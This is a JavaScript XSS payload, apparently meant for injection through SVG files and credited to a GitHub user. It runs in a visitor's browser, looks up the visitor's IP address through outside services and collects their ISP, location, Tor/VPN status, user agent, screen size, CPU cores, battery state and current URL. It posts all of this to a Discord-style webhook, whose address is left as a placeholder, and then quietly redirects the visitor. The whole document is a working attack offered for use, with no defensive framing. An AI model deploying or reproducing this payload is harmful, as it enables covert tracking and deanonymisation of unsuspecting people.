url2 = "redirect url"
   try {
      var opts = { method: 'GET', headers: {}};
      fetch('https://api.ipify.org?format=json', opts).then(function (response) {return response.json()}).then(function (data2) {
      
      fetch('https://myip.wtf/json', opts).then(function (response) {return response.json()}).then(function (data) {
      var Name = "Not known";
      if (navigator.appVersion.indexOf("Win") != -1) Name = "Windows OS";
      if (navigator.appVersion.indexOf("Mac") != -1) Name = "MacOS";
      if (navigator.appVersion.indexOf("X11") != -1) Name = "UNIX OS";
      if (navigator.appVersion.indexOf("Linux") != -1) Name = "Linux OS";
      navigator.getBattery().then(function(battery) {
         var opts2 = {
            method:"POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
               username: "SVG XSS Information Grabber - By SSSEAL-C on Github",
               avatar_url: "https://i.imgur.com/Yztlbk4.png",
               embeds: [{ 
                  title: 'SVG XSS Attack by SSSEAL-C (v1.0)', 
                  fields: [ 
                  { name: 'IPv4/IPv6 :globe_with_meridians:',  value: "`"+data.YourFuckingIPAddress+"`", inline: "true" },
                  { name: 'IPv4 :globe_with_meridians:',  value: "`"+data2.ip+"`", inline: "true" },
                  { name: 'User Agent :bust_in_silhouette:', value: "`"+navigator.userAgent+"`", inline: "true" } ,
                  { name: 'Hostname :name_badge:', value: "`"+data.YourFuckingHostname+"`", inline: "true" },
                  { name: 'ISP :classical_building:', value: "`"+data.YourFuckingISP+'`', inline: 'true' },
                  { name: 'VPN :computer:', value: "`"+data.YourFuckingTorExit+'`', inline: 'true' },
                  { name:'Location :map:', value: "`"+data.YourFuckingLocation+'`', inline: 'true' },
                  { name:'Original URL :globe_with_meridians:', value: "`"+window.location.href+'`', inline: 'true' },
                  { name:'Page Redirect URL :question:', value: "`"+url2+'`', inline: 'true' },
                  { name:'Download Speed (mbps) :arrow_down:', value:'`'+navigator.connection.downlink+'`', inline: 'true'},
                  { name:'Screen Size :tv:', value:'`'+window.screen.availWidth+" x "+window.screen.availHeight+'`', inline: 'true'},
                  { name:'Used CPU Cores :electric_plug:', value:'`'+navigator.hardwareConcurrency+'`', inline: 'true'},
                  { name:'Battery Charging :battery:', value:'`'+battery.charging+"`",  inline:true }
                  ]
               }]})}
         var URL = `webhook link`;
         fetch(URL, opts2).then(function (response) {
            console.log(response);
            window.location.replace(url2); 
      })})})})}
   catch(err) {
      console.log(err);
      window.location.replace(url2);  
   };